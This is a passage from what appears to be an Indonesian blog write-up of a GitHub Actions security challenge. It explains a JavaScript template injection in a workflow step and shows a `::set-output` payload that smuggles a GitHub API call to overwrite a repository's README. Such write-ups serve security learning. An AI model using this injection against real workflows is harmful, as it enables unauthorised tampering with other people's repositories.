...
<p align="center">
  <img src="https://github.com/fadhilthomas/fadhilthomas.github.io/raw/master/assets/images/github01/logo.svg">
</p>
...
<p align="center">
  <img src="https://github.com/fadhilthomas/fadhilthomas.github.io/raw/master/assets/images/github01/github01.png">
</p>
...
Pada step kedua, terdapat pengecekan kondisi apabila keluaran dari `COMMENT_ID` pada step pertama bernilai `true` atau `1`, maka Github Action akan mengeksekusi script berikut {% raw %}```const id = ${{ steps.comment_log.outputs.COMMENT_ID }}```{% endraw %} yang mana, terdapat celah keamanan yaitu *javascript template injection*. 
...
{% highlight yaml %}
::set-output name=COMMENT_ID::1;await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: 'incrediblysecureinc', repo: 'incredibly-secure-fadhilthomas', path: 'README.md', message: 'update: escalation', content: 'dGFrZW5z', sha: '4183b7e35a40d11acf98bad686ed2f6834cd71d0' })
{% endhighlight %}
...
<p align="center">
  <img src="https://github.com/fadhilthomas/fadhilthomas.github.io/raw/master/assets/images/github01/github02.png">
</p>
